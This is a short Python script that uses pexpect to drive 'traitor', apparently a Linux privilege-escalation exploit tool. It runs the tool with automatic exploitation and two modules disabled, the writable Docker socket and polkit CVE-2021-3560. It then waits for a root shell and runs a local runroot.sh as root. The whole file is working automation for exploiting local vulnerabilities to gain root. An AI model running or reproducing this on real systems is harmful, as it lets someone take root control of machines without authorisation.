import pexpect, os
dir_path = os.path.dirname(os.path.realpath(__file__))
# Disable the obnoxious polkit that broke my machine twice. And the slow af docker socket
child = pexpect.spawn('./traitor -a -k docker:writable-socket -k polkit:CVE-2021-3560')

# Wait for the root shell prompt (this may need to be adjusted depending on the exact prompt)
child.expect("#")  # You can change this to whatever prompt is shown (e.g., "root@hostname")

# Send commands to the root shell
child.sendline('')
child.expect("#")  # Adjust this to match the prompt after the command is executed
child.sendline('%s/runroot.sh %s' % (dir_path, dir_path))
child.expect("#")
# child.sendline('cd %s' % (dir_path))
# child.expect("#")

# Optionally, exit the shell after the commands
child.sendline('exit')

# Interact with the shell if needed
child.interact()
